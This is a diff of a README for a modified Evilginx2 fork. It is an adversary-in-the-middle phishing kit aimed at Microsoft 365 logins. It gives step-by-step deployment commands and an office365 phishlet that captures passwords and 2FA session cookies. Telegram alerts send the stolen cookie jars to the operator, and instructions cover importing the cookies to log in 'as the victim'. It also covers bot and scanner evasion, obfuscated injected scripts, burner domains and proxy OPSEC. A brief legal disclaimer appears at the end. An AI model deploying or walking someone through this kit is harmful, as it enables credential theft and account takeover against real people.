-| Flag | Purpose |
-|:-----|:--------|
-| `-p <dir>` / `-t <dir>` / `-c <dir>` | Custom phishlets / redirectors / config directories |
-| `-dashboard 0.0.0.0:5000` | Simple dashboard address (empty disables) |
-| `-dashboard-user` / `-dashboard-pass` | Simple dashboard login (empty pass = no auth) |
-| `-webapi-port 8082` | Web admin panel port (0 disables) |
-| `-turnstile SITEKEY:SECRET` | Cloudflare Turnstile CAPTCHA challenge |
-| `-feed` | Live feed (requires separate evilfeed process) |
-| `-geoip-db <dir>` | Path to GeoLite2 databases |
-| `-block-vpn` | Block VPN/proxy/datacenter visitors |
-| `-block-countries RU,CN` | Block specific countries |
-| `-debug` / `-developer` | Verbose logging / self-signed certs for local testing |
+Let's Encrypt ACME built in and issued automatically when a phishlet is enabled. A pre-bought wildcard cert in `data/crt/wildcard/` covers every subdomain and keeps them off crt.sh. Enable issuance can time out on 16 hosts at once — `test-certs` in the console retries.
 
 ---
 
 # 🏗️ How It Works
 
 ```
-┌────────────────────────────────────────────────────────────────────┐
-│ VICTIM clicks the phishing link                                     │
-└───────────────────────────────┬────────────────────────────────────┘
-                                ▼
-┌────────────────────────────────────────────────────────────────────┐
-│ EVILGINX2 SERVER (your VPS)                                        │
-│                                                                    │
-│ 1. DNS resolves login.your-domain.com → your VPS IP                 │
-│ 2. TLS terminated with valid Let's Encrypt (or wildcard) cert     │
-│ 3. BOT FILTER: known crawler/automation UA? → decoy page + BLOCK │
-│ 4. Blacklist / GeoIP / VPN / country checks                        │
-│ 5. Session created → VISITOR ARRIVAL ALERT to Telegram              │
-│ 6. Request forwarded to the REAL website (Evilginx headers stripped)│
-│ 7. Victim sees the real login page, types creds + 2FA              │
-│ 8. Credentials + session cookies captured                           │
-│ 9. Background: credential validation + auto-export to disk         │
-│ 10. Telegram alert with cookies attached → your phone              │
-│ 11. Victim redirected onward — no suspicion                        │
-└────────────────────────────────────────────────────────────────────┘
+VICTIM clicks the link
+        │
+        ▼
+┌──────────────────────────────────────────────────────────┐
+│ YOUR VPS                                                  │
+│  1. DNS → your IP                                         │
+│  2. TLS with valid ACME / wildcard cert                   │
+│  3. Bot filter → crawler? decoy page + block              │
+│  4. Blacklist / GeoIP / VPN / country checks              │
+│  5. Session created → visitor-arrival alert               │
+│  6. Proxy resolved (lure > phishlet > global) → tunnel    │
+│  7. Request forwarded, Evilginx headers stripped          │
+│  8. Victim logs into the REAL site incl. their own 2FA    │
+│  9. Cookies + creds captured (all cookies, real expiry)   │
+│ 10. rewrite_urls / DOM injection applied to the response  │
+│ 11. Validation + auto-export + Telegram with the jar      │
+│ 12. Victim redirected onward, no suspicion                │
+└──────────────────────────────────────────────────────────┘
 ```
 
 ---
 
 # 🚀 Quick Start
 
-### Docker (recommended — 10 minutes, baby steps)
+### Requirements
+
+Ubuntu 22.04/24.04 or Debian 12 · root · a domain with `@` **and** `*` A-records pointed at the box (DNS-only, no orange cloud) · ports 22, 53/udp, 53/tcp, 80, 443, 5000, 8082 open.
 
 ```bash
-# 1. Point your domain's A-record at your VPS (DNS-only, no proxy)
-# 2. SSH into your VPS, then:
-git clone https://github.com/trustwomanaturownrisk/evilginx2.git   # or your fork URL
-cd evilginx2
+# 1. SSH in
+ssh root@YOUR_IP
 
-# 3. Create your .env (see Environment Variables Reference below)
-cp .env.example .env 2>/dev/null || nano .env
+# 2. Free port 53 without killing DNS
+sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
+sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
+ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
+systemctl restart systemd-resolved
 
-# 4. Build and run
-docker compose up -d --build
+# 3. Firewall
+ufw allow 22/tcp && ufw allow 53/udp && ufw allow 53/tcp
+ufw allow 80/tcp && ufw allow 443/tcp
+ufw allow 5000/tcp && ufw allow 8082/tcp && ufw enable
 
-# 5. Watch the startup
-docker logs -f evilginx2
-```
+# 4. Docker
+curl -fsSL https://get.docker.com | sh
 
-Ports used: 53/udp, 53/tcp, 80, 443 (phishing engine), 5000 (simple dashboard), 8082 (web admin panel).
-
-📖 **For the complete beginner-proof, copy-paste deployment guide: see [dockerdeployment.md](dockerdeployment.md)**
-
-### Manual (advanced)
-
-```bash
-# Requires Go 1.25+ (GOTOOLCHAIN=auto downloads the exact version go.mod asks for)
+# 5. Clone
 git clone https://github.com/trustwomanaturownrisk/evilginx2.git
 cd evilginx2
+chmod +x entrypoint.sh telegram-watch.sh
+
+# 6. Your .env (not tracked — you create it)
+nano .env            # copy the block from Environment Variables below
+
+# 7. Validate the shipped phishlet before anything reads it
+apt install -y python3-yaml
+python3 validate_phishlet.py
+
+# 8. Build and run
+docker compose build
+docker compose up -d
+
+# 9. Configure
+docker compose attach evilginx
+#   config domain YOUR_DOMAIN
+#   config ipv4 external YOUR_IP
+#   blacklist unauth
+#   config strip_headers on
+#   phishlets hostname office365 YOUR_DOMAIN
+#   phishlets enable office365
+#   lures create office365
+#   lures get-url 0
+#   Ctrl-p Ctrl-q to detach
+```
+
+📖 **Full 31-stage beginner walkthrough: [dockerdeployment.md](dockerdeployment.md)**
+
+### Manual
+
+```bash
+# Go 1.25+ (GOTOOLCHAIN=auto fetches the version go.mod asks for)
 go mod tidy
 go build -trimpath -ldflags="-s -w" -o evilginx .
 ./evilginx -dashboard 0.0.0.0:5000 -webapi-port 8082
@@ -377,232 +403,452 @@ go build -trimpath -ldflags="-s -w" -o evilginx .
 
 ---
 
-# ⚙️ Environment Variables Reference
+# ⚙️ Environment Variables
 
-Everything is configured through `.env` (Docker) — all optional with safe defaults.
+All optional, all safe by default.
 
 ### Core
 
-| Variable | Default | What it does |
-|:---------|:--------|:--------------|
-| `TZ` | `UTC` | Timezone for logs (`America/New_York`, `Africa/Lagos`, ...) |
-| `TG_BOT_TOKEN` | (empty) | Telegram bot token from @BotFather |
-| `TG_CHAT_ID` | (empty) | Telegram chat ID for notifications |
+| Variable | Default | Purpose |
+|:--|:--|:--|
+| `TZ` | `UTC` | log timezone |
+| `TG_BOT_TOKEN` | — | Telegram bot token |
+| `TG_CHAT_ID` | — | Telegram chat ID |
 
-### Simple dashboard (port 5000)
+### Panels
 
-| Variable | Default | What it does |
-|:---------|:--------|:--------------|
-| `DASHBOARD_ADDR` | `0.0.0.0:5000` | Listen address; empty string disables |
-| `DASHBOARD_USER` | `admin` | Login username |
-| `DASHBOARD_PASS` | (empty) | Login password — **empty = NO auth** (always set one) |
-| `DASHBOARD_ENABLED` | `true` | `false`/`0`/`no`/`off` disables the panel |
+| Variable | Default | Purpose |
+|:--|:--|:--|
+| `DASHBOARD_ADDR` | `0.0.0.0:5000` | dashboard listen; empty disables |
+| `DASHBOARD_USER` | `admin` | dashboard login |
+| `DASHBOARD_PASS` | — | empty = **no auth** — always set one |
+| `DASHBOARD_ENABLED` | `true` | `0` disables |
+| `WEBAPI_PORT` | `8082` | admin panel port; `0` disables |
+| `WEBAPI_USER` | `admin` | permanent admin user |
+| `WEBAPI_PASS` | — | empty = random password printed once; the `.env` value always wins so you can never be locked out |
 
-### Web admin panel (port 8082)
+### Capture & export
 
-| Variable | Default | What it does |
-|:---------|:--------|:--------------|
-| `WEBAPI_PORT` | `8082` | Listen port; `0` disables |
-| `WEBAPI_USER` | `admin` | Permanent admin username |
-| `WEBAPI_PASS` | (empty) | Permanent admin password. Empty = a random password is printed in the logs once. The `.env` value always wins over the database — it can never lock you out. |
+| Variable | Default | Purpose |
+|:--|:--|:--|
+| `CAPTURE_ALL_COOKIES` | `true` | also capture cookies the phishlet did not declare |
+| `COOKIE_EXPORT_DEFAULT_DAYS` | `30` | lifetime given to cookies that arrived without an expiry |
+| `AUTO_EXPORT` | `true` | write export files |
+| `AUTO_EXPORT_PATH` | `<config dir>/exports` | persistent, survives rebuilds |
+| `AUTO_EXPORT_FORMAT` | `json` | `json` or `csv` |
+| `AUTO_EXPORT_PER_FILE` | `true` | one file per session |
 
-### Operator features
+### Pro features
 
-| Variable | Default | What it does |
-|:---------|:--------|:--------------|
-| `BOT_FILTER` | `true` | Bot/crawler user-agent filtering. `0` disables |
-| `VISITOR_ALERTS` | `true` | Instant Telegram ping when a visitor lands. `0` disables |
-| `CSS_RANDOMIZATION` | `true` | Per-page-load CSS randomization. `0` disables |
-| `SESSION_RETENTION_DAYS` | `0` (off) | Auto-delete sessions older than N days (checks hourly) |
-| `BACKUP_ENABLED` | `true` | Automatic DB + config backups. `0` disables |
-| `BACKUP_INTERVAL_HOURS` | `6` | Hours between backups |
-| `BACKUP_KEEP` | `10` | How many backup copies to keep |
+| Variable | Default | Purpose |
+|:--|:--|:--|
+| `DOM_INJECTION` | `true` | DOM engine; `0` = regex fallback |
+| `REWRITE_URLS` | `true` | URL path rewriting |
+| `CSS_RANDOMIZATION` | `true` | per-load pixel fingerprint |
 
-> ⚠️ **Golden rule:** after editing `.env`, always apply it with
-> `docker compose up -d` (NOT plain `restart` — a restart never re-reads `.env`).
+### Ops
+
+| Variable | Default | Purpose |
+|:--|:--|:--|
+| `BOT_FILTER` | `true` | crawler filtering |
+| `VISITOR_ALERTS` | `true` | instant arrival ping |
+| `SESSION_MEMORY_HOURS` | `2` | keep a finished session in RAM this long |
+| `SESSION_RETENTION_DAYS` | `0` (off) | delete DB sessions older than N days |
+| `BACKUP_ENABLED` | `true` | DB + config backups |
+| `BACKUP_INTERVAL_HOURS` | `6` | backup cadence |
+| `BACKUP_KEEP` | `10` | copies retained |
+
+> ⚠️ After editing `.env` run `docker compose up -d` — a plain `restart` never re-reads `.env`.
+
+> ⚠️ `AUTO_EXPORT_PATH` must resolve **inside** `/home/evilginx/.evilginx/` (the mounted volume). An empty value falls back to the default, but an off-volume path means exports vanish on rebuild.
 
 ---
 
-# 📊 Web Interfaces
+# 🛠️ Phishlet Tooling
 
-### Web Admin Panel — `http://YOUR_VPS_IP:8082`
+Three scripts at the repo root. Use them in this order.
 
-Login with `WEBAPI_USER` / `WEBAPI_PASS` from `.env`. Capabilities:
+### 1. `patch_phishlet.py` — fix a phishlet
 
-- **Sessions** — search, filter, export, bulk delete, mark reviewed, download cookies as `cookies_N.json`
-- **Stats** — totals, timeline, per-phishlet breakdown
-- **Phishlets** — enable/disable/hide/set hostname/create from YAML
-- **Lures** — create, delete, generate phishing URLs
-- **Telegram settings** — set bot token + chat ID without touching `.env`
-- **Users** — admin / operator / viewer roles
-- **Audit log** — who did what, when, from which IP
+```bash
+python3 patch_phishlet.py                    # office365.yaml
+python3 patch_phishlet.py phishlets/foo.yaml # any other file
+```
 
-**Roles in plain English:** `admin` does everything; `operator` manages lures/phishlets/sessions but not users; `viewer` is read-only.
+Replaces only the top-level `js_inject` block and inserts `rewrite_urls` before `auth_tokens`. Every filter line is untouched. Always writes a timestamped `.bak` first.
 
-### Simple Dashboard — `http://YOUR_VPS_IP:5000`
+### 2. Consumer tokens → optional
 
-Sortable, searchable sessions table with CSV/JSON export, dark mode, auto-refresh, and per-session detail view. Login with `DASHBOARD_USER` / `DASHBOARD_PASS` from `.env`.
+Run the flip block from the [deployment guide](dockerdeployment.md) Stage 22. It converts 27 `.live.com` / `.login.live.com` names from `:always` to `:opt` so `cookies_complete` is reachable on a work account.
+
+### 3. `validate_phishlet.py` — the gate
+
+```bash
+python3 validate_phishlet.py
+```
+
+```
+always tokens : 12 (expect 12)
+opt tokens    : 31 (expect >= 30)
+
+RESULT: PASSED
+```
+
+Fails on: stray `1p(`, missing `function lp()`, missing `split('#')`, missing injection bootstrap, wrong `location`, missing `rewrite_urls`, missing `auth_urls`, missing required `ESTSAUTH*`, wrong token counts, short filter list, and any YAML parse error.
+
+**Run it after every phishlet edit.** Two seconds, catches everything.
+
+### 4. `make_cookie_import.py` — convert an export
+
+```bash
+python3 make_cookie_import.py
+```
+
+Writes `cookies-import.json` (Cookie-Editor) and `cookies-netscape.txt` (curl). Prints every captured cookie and a PRESENT/absent line for each essential. Handles every export shape evilginx can emit.
+
+> **Pass condition:** `ESTSAUTH`, `ESTSAUTHPERSISTENT` and `ESTSAUTHLIGHT` must all read PRESENT. `MSPAuth`, `RPSSecAuth`, `WLSSC`, `ANON` reading absent is correct on a work account.
+
+---
+
+# 📊 Web Interfaces & API
+
+### Admin panel — `http://YOUR_IP:8082`
+
+Login with `WEBAPI_USER` / `WEBAPI_PASS`. Sessions (search/filter/export/bulk delete/mark reviewed/**download cookies**), stats, phishlets, lures, **proxies**, Telegram settings, users, audit log.
+
+**Roles:** `admin` everything · `operator` lures/phishlets/sessions/proxies · `viewer` read-only.
+
+### API endpoints
+
+| Method | Endpoint | Auth | Purpose |
+|:--|:--|:--|:--|
+| `GET` | `/api/sessions/cookies?id=N` | session | Cookie-Editor JSON jar |
+| `GET` | `/api/sessions/cookies.txt?id=N` | session | Netscape `cookies.txt` |
+| `GET` | `/api/proxies` | operator | list proxies + global binding |
+| `POST` | `/api/proxies` | operator | create/update a proxy |
+| `DELETE` | `/api/proxies?name=X` | operator | delete a proxy |
+| `POST` | `/api/proxies/test` | operator | dial through it, return egress IP |
+| `POST` | `/api/proxies/assign` | operator | bind a proxy to `global` / `phishlet` / `lure` |
+
+> All of these are auth-gated. A bare `curl` returns `{"error":"unauthorized"}` — log in first and reuse the cookie jar (`curl -c jar` then `curl -b jar`).
+
+### Dashboard — `http://YOUR_IP:5000`
+
+Sortable, searchable sessions with CSV/JSON export, dark mode, auto-refresh, per-session detail. HTTP basic auth.
 
 ---
 
 # 🔧 Telegram Setup
 
-### Step 1: Create a Bot
-
-1. Open Telegram → search **`@BotFather`** (verified, blue checkmark)
-2. Send `/newbot`
-3. Choose a name, then a username ending in `bot`
-4. **Copy the token** — looks like `8863425004:AAF7mZ0poUo6dal8-...`
-
-### Step 2: Get Your Chat ID
-
-1. Send your new bot **any message** (e.g., "hello")
-2. Open `https://api.telegram.org/bot<TOKEN>/getUpdates` in a browser
-3. Find `"chat":{"id":7545456339,...}` — that number is your Chat ID
-
-### Step 3: Configure
-
-Either in `.env` (`TG_BOT_TOKEN` + `TG_CHAT_ID`), or in the web admin panel (8082 → Telegram settings → save — no restart needed), or in the console:
+1. Telegram → **@BotFather** → `/newbot` → copy the token.
+2. Send your bot any message, then open
+   `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy the `chat.id` number.
+3. Configure — `.env` (`TG_BOT_TOKEN`, `TG_CHAT_ID`), or the panel, or the console:
 
 ```
-evilginx> config teletoken 8863425004:AAF7mZ0poUo6dal8-...
-evilginx> config chatid 7545456339
+config teletoken 8863425004:AAF7mZ0poUo6dal8-...
+config chatid 7545456339
+config telegram test
 ```
 
-✅ You will now receive: visitor arrival pings, credential alerts, full cookie files, and validation results.
+You will now receive arrival pings, credential alerts with the cookie file attached, and validation results.
 
 ---
 
-# 🎣 Creating Your First Campaign
+# 🍪 Cookie Import — the part everyone gets wrong
+
+1. `python3 make_cookie_import.py` — confirm all three essentials read PRESENT.
+2. Confirm the jar works outside a browser:
+
+```bash
+curl -s -b cookies-netscape.txt -o /dev/null -w "http %{http_code}\n" \
+  "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
+```
+
+`http 200` or the jar is stale.
+
+3. Install **Cookie-Editor** (Chrome, Edge, Brave, Firefox).
+4. Open a **fresh private window** and go to the **real** site the victim used — `https://login.microsoftonline.com`, exactly.
+5. Cookie-Editor → **Import** → paste the **entire** `cookies-import.json`.
+6. Reload. You are logged in as the victim.
+
+### The bracket trap
+
+The jar is a JSON **array**. It starts with `[` and ends with `]`. Selecting from the first `{` gives *"the input is not in a valid format"* — which looks exactly like a broken capture but isn't.
+
+Two safe ways to copy it:
+
+**A. Off the box.** From Windows `cmd` (not the SSH session — `%VAR%` only expands in cmd):
 
 ```
-evilginx> phishlets hostname office365 your-domain.com
-evilginx> phishlets enable office365
-evilginx> lures create office365
-evilginx> lures get-url 0
+cd %USERPROFILE%\Downloads
+scp root@YOUR_IP:~/evilginx2/cookies-import.json .
 ```
 
-✅ Output: `[0] https://login.your-domain.com/a8f3k2m1`
+Open in Notepad, `Ctrl+A`, `Ctrl+C`.
 
-That's your phishing URL. When a victim visits it:
+**B. One line.** Then **triple-click** the line (triple-click selects the whole wrapped line, brackets included) — do not drag:
 
-1. 👀 Instant visitor arrival ping (if Telegram configured)
-2. 📱 Credential + cookie alert hits your phone within seconds
-3. 📊 Session appears in both panels within 5 seconds
-4. 🌍 GeoIP shows country, city, and VPN status
-5. ✅ Credentials are auto-validated in the background
-6. 🍪 Cookies are auto-exported to disk + attached in Telegram
+```bash
+cat cookies-import.json | tr -d '\n'
+```
+
+### If login fails, read the verdict first
+
+```bash
+grep -o '"cookies_complete": *[a-z]*' data/exports/latest_office365.all.json
+grep -o '"missing_auth_tokens": *\[[^]]*\]' data/exports/latest_office365.all.json
+```
+
+- `cookies_complete: true` → the jar is whole; the problem is the host you imported on, or the session aged out.
+- `cookies_complete: false` → `missing_auth_tokens` names the exact cookie that never arrived. Usually the victim skipped "Stay signed in" — that click is what issues `ESTSAUTHPERSISTENT`.
+
+Never hand-edit a `.cookies.json`. Re-import the whole array.
+
+---
+
+# 🧬 DOM Injection Guide
+
+```yaml
+js_inject_default_location: 'body_bottom'
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/common/oauth2/v2.0/authorize']
+    trigger_params: ['client_id']
+    location: 'head'
+    script: |
+      window.__injected = true;
+```
+
+| Field | Meaning |
+|:--|:--|
+| `trigger_domains` | hosts this script fires on |
+| `trigger_paths` | regexes the path must match — unanchored, so no trailing `*` needed |
+| `trigger_params` | optional lure params that must all be present |
+| `location` | `head` · `body_top` · `body_bottom` (falls back to the default) |
+| `script` | the JavaScript; `{param}` is replaced with the lure param value |
+
+The injected script is served from `/s/<sid>/<js_id>.js` and is base64-obfuscated. CSP nonces are inherited automatically. Injection is a real HTML5 parse — a weird attribute order or an embedded comment can no longer make it vanish.
+
+> ⚠️ An injected script with a `SyntaxError` fails **silently**. The browser swallows it and the feature just never runs. Always check the browser console, and always run the validator.
+
+---
+
+# 🌐 rewrite_urls Guide
+
+```yaml
+rewrite_urls:
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/signin'
+      query:
+        - key: 'boop'
+          value: '{id}'
+      exclude_keys: ['client_id']
+```
+
+- An **empty** `domains` or `paths` list means "any".
+- `{id}` is replaced with a fresh random token per hit.
+- `exclude_keys` copies those keys through from the original query untouched.
+- The rewritten URL is TTL-cached so the follow-up request is translated back before reaching the origin.
+
+> ⚠️ **Known caveat on Microsoft.** The page appends `&sso_reload=true` after the rewrite, the exact-match cache misses, and evilginx returns its own 404 (*"this page can't be found"*). The filters already cover the long path, so the template ships `REWRITE_URLS=false`. Test it **after** your first successful capture, and never open `/signin?...` directly — it only resolves while a session holds that cache entry.
+
+---
+
+# 🛰️ Proxies Guide
+
+**`proxy` is not a host command.** There is no `proxy` binary on the box; `apt install libproxy-tools` is a different thing. These only exist inside the evilginx console.
+
+```bash
+docker compose attach evilginx
+```
+
+```
+proxy create uk-1 socks5 1.2.3.4 1080
+proxy test uk-1
+proxy use uk-1                                  # global
+proxy assign phishlet office365 uk-1            # this phishlet only
+proxy assign lure 3 uk-1                        # this lure only
+proxy list
+proxy off                                       # clear global
+proxy delete uk-1
+```
+
+Resolution order at session creation: **lure → phishlet → global → direct.**
+
+Auth is supported (`username`/`password` on create via the API), and disabled proxies fall through to the next scope.
+
+> ⚠️ `proxy test` returning `context deadline exceeded` is not an evilginx fault — it's a dead proxy. Check it from the host first:
+> `curl -s --socks5 1.2.3.4:1080 https://api.ipify.org; echo`
+
+> **OPSEC:** SOCKS5 preserves the client TLS signature (JA4). An HTTP proxy re-signs it. Use SOCKS5 on real engagements.
 
 ---
 
 # 🛡️ Bot Protection & OPSEC
 
-### Layers of Protection
-
 | Layer | Trigger | Action |
-|:------|:--------|:-------|
-| Bot filter (UA-based) | 40+ known crawler/automation signatures | Decoy page (unauth_url) or block |
-| IP blacklist | Unauthorized / all / unauth modes | Decoy page or 403 |
-| GeoIP country blocking | Configured ISO codes | Block |
-| VPN/proxy/datacenter | `-block-vpn` flag | Block |
-| Turnstile CAPTCHA | `-turnstile` flag | Force CAPTCHA challenge |
-| Header stripping | Always on (config) | Removes Evilginx fingerprints both directions |
-| URL rewriting | Always on | Cleans address bar + DOM |
-| CSS randomization | Every page load | Unique pixel fingerprint |
-| Dynamic content spoofing | Every blocked visitor | Real-looking decoy content |
-| JS obfuscation | Injected scripts | Base64+eval wrapped |
+|:--|:--|:--|
+| Bot filter | 40+ crawler/automation UAs | decoy page or block |
+| IP blacklist | `all` / `unauth` modes | decoy or 403 |
+| GeoIP country block | ISO codes | block |
+| VPN/proxy/datacenter | `-block-vpn` | block |
+| Turnstile | `-turnstile` | CAPTCHA challenge |
+| Header stripping | always | removes fingerprints both ways |
+| URL rewriting | always | cleans address bar + DOM |
+| CSS randomisation | every load | unique pixel fingerprint |
+| Dynamic spoofing | every blocked visitor | real-looking decoy |
+| JS obfuscation | injected scripts | base64 + eval |
 
-### OPSEC Tips
-
-- Use WHOIS privacy and a burner domain for the phishing hostname
-- Use DNS-only ("grey cloud") records if behind Cloudflare DNS
-- Prefer a wildcard certificate so only your root domain appears on crt.sh
-- Keep `blacklist unauth` on — unauthorized visitors get the decoy page
+**Tips:** burner domain, WHOIS privacy, DNS-only records, wildcard cert so only the root appears on crt.sh, keep `blacklist unauth` on, keep `SESSION_RETENTION_DAYS` set so the DB stays small, and never restart the container while a victim is mid-login.
 
 ---
 
 # 📋 Commands Reference
 
-### Core Configuration
+### Config
 
 ```
-config domain example.com              Set your phishing domain
-config ipv4 external 1.2.3.4         Set your VPS IP
-config autocert on                    Enable auto SSL certs
-config unauth_url https://...         Decoy for unauthorized visitors
-config strip_headers on               Hide Evilginx headers
+config domain example.com
+config ipv4 external 1.2.3.4
+config autocert on
+config unauth_url https://...
+config strip_headers on
+config telegram test
 ```
 
 ### Telegram
 
 ```
-config teletoken 123456:ABC-DEF...    Set bot token
-config chatid 123456789               Set chat ID
-test telegram                         Test notifications
+config teletoken <token>
+config chatid <id>
 ```
 
 ### Phishlets
 
 ```
-phishlets hostname office365 dom.com  Set hostname
-phishlets enable office365            Enable (auto-issues cert)
-phishlets disable office365           Disable
-phishlets hide office365              Hide (block all traffic)
-phishlets list                        List all
+phishlets hostname office365 dom.com
+phishlets enable office365
+phishlets disable office365
+phishlets hide office365
+phishlets unhide office365
+phishlets get-hosts office365
+phishlets create <template> <child> key=value
+phishlets delete <child>
 ```
 
 ### Lures
 
 ```
-lures create office365                Create new lure
-lures get-url 0                      Get phishing URL
-lures list                           List all
-lures pause 0 / unpause 0            Pause / resume
+lures create office365
+lures get-url 0
+lures edit 0 proxy uk-1
+lures edit 0 redirect_url https://real-site.com
+lures pause 0 1h
+lures unpause 0
+lures delete 0
+lures delete all
 ```
 
-### Blacklist
+### Proxies
 
 ```
-blacklist all                         Block all non-whitelisted
-blacklist unauth                      Block unauthorized only
-blacklist off                         Disable blacklist
+proxy
+proxy list
+proxy create <name> <http|https|socks5|socks5h> <address> <port>
+proxy delete <name>
+proxy use <name>
+proxy off
+proxy test <name>
+proxy assign <global|phishlet|lure> <target> <name>
+proxy enable | disable | type | address | port | username | password
 ```
 
 ### Sessions
 
 ```
-sessions                              List captured sessions
-sessions <id>                        Show full detail
-sessions delete <id>                 Delete session
+sessions
+sessions <id>
+sessions delete <id>
+sessions delete 1-7,10-12
+sessions delete all
 ```
+
+### Blacklist
+
+```
+blacklist all | unauth | noadd | off
+blacklist log on | off
+```
+
+### Console control
+
+`Ctrl-p` then `Ctrl-q` detaches. Never `Ctrl-c`, never `exit`.
+
+---
+
+# 🧯 Troubleshooting
+
+| Symptom | Cause | Fix |
+|:--|:--|:--|
+| `validate_phishlet.py` → `SyntaxError: cd ~/evilginx2` | shell wrapper committed with the file | strip everything before the shebang and after `sys.exit(main())` |
+| `validate_phishlet.py` → `sub_filters list looks short` | threshold too high | `sed -i 's/len(sf) > 100/len(sf) >= 80/' validate_phishlet.py` |
+| `validate_phishlet.py` → `1p(` present | patch didn't take | restore `.orig`, rerun `patch_phishlet.py` |
+| Email box never autofills | lure URL has no `#email`, or `DOM_INJECTION=0` | append `#user@example.com`; set `DOM_INJECTION=true` |
+| `/signin` returns 404 | `sso_reload` breaks the rewrite cache | `REWRITE_URLS=false` + `up -d` |
+| `Command 'proxy' not found` | typed in the shell | `docker compose attach evilginx` first |
+| `proxy test` times out | dead proxy, not evilginx | `curl --socks5 ADDR:PORT https://api.ipify.org` |
+| `hostname ... collision` on boot | stale `o365.yaml` / `1.yaml` present | `git rm -f phishlets/1.yaml phishlets/o365.yaml` |
+| `AUTO_EXPORT_PATH=[]` in the container | empty value in `.env` | set it to `/home/evilginx/.evilginx/exports`, `up -d` |
+| Exports vanish after rebuild | path not on the volume | same |
+| `! [rejected] master -> master` on push | local and remote diverged | `git fetch origin master && git reset --soft origin/master && git add -A && git commit && git push` |
+| `Author identity unknown` | no git identity | `git config --global user.name/user.email` |
+| Imported cookies don't log in | jar incomplete | check `cookies_complete`; redo the capture; click "Stay signed in" |
+| Cookie-Editor "invalid format" | paste missing `[` `]` | `cat cookies-import.json \| tr -d '\n'` then triple-click, or scp the file |
+| Red page after import | wrong host, or incomplete jar | import on `login.microsoftonline.com` |
+| Logs out after a minute | session cookies only | redo capture, click "Stay signed in" → Yes |
+| `__Host-` cookie rejected | mismatched domain | import on the exact host, then open `login.live.com` once |
+| `validProxyTypes redeclared` | declared in both files | delete it from `config_proxy.go` |
+| Cert issuance times out on enable | ACME slow on 16 hosts | `test-certs` in the console |
+| Panel unreachable | bound to localhost | it binds `0.0.0.0`; check the firewall |
+| Panel login rejected after `.env` edit | used `restart` | `docker compose up -d` |
+| Bot filter blocks a real visitor | unusual UA | `BOT_FILTER=0` and restart |
 
 ---
 
 # 👏 Credits
 
 | Contribution | Author |
-|:-------------|:-------|
-| Original Evilginx2 core | **Kuba Gretzky (@kgretzky)** |
-| Telegram integration, dashboards, GeoIP engine, credential validation, CSS randomization, extension detection, header stripping, URL rewriting, dynamic content spoofing, bot filtering, visitor alerts, session retention, auto-backups | @officialmonsterz + fork maintainers |
+|:--|:--|
+| Original Evilginx2 core | **Kuba Gretzky ([@kgretzky](https://github.com/kgretzky))** |
+| Telegram integration, panels, GeoIP, credential validation, CSS randomisation, extension detection, header stripping, URL rewriting, dynamic spoofing, bot filtering, visitor alerts, retention, backups | **Official Monsterz** — [t.me/officialmonsterz](https://t.me/officialmonsterz) · [github.com/officialmonsterz](https://github.com/officialmonsterz) · shapads@tutamail.com |
+| DOM injection engine, `rewrite_urls`, multi-scope tunnelling proxies, cookie capture/export rebuild, completeness verification, thread-safety hardening | this fork |
+| Phishlet patcher, validator, cookie converter, A-to-Z deployment guide, fixed `office365` phishlet | this fork |
+
+**Reach the original author of the phishlet work and the panel/Telegram stack:**
+
+- Telegram: [t.me/officialmonsterz](https://t.me/officialmonsterz)
+- GitHub: [github.com/officialmonsterz](https://github.com/officialmonsterz)
+- Email: shapads@tutamail.com
+
+If this saved you a week, go and thank the people who built the parts this stands on.
 
 ---
 
 # ⚠️ Legal Notice
 
-This software is a **dual-use tool** designed exclusively for:
-
-- ✅ Authorized penetration testing with written permission
-- ✅ Security research in controlled environments
-- ✅ Red team engagements under signed Rules of Engagement
-- ✅ Education in accredited cybersecurity programs
-
-It is **NOT** for unauthorized access to systems you do not own, identity theft, credential harvesting, or fraud. By using this software you accept full legal responsibility for your actions.
+Dual-use tool intended for authorised penetration testing, security research, red-team engagements under signed RoE, and accredited education. Not for unauthorised access, identity theft, credential harvesting or fraud. You accept full legal responsibility for your use.
 
 ---
 
 <p align="center">
-  <sub>Built by red teamers, for red teamers. Based on the pioneering work of <a href="https://t.me/officialmonsterz">Official Monsterz</a>. Licensed under BSD 3-Clause.</sub>
+  <b>If this repo saved you time, star it — it's the only signal that keeps it maintained.</b>
 </p>
-```
 
----
+<p align="center">
+  <sub>Built by red teamers, for red teamers. Based on the pioneering work of <a href="https://t.me/officialmonsterz">Official Monsterz</a> and <a href="https://github.com/kgretzky">Kuba Gretzky</a>. Licensed under BSD 3-Clause.</sub>
+</p>
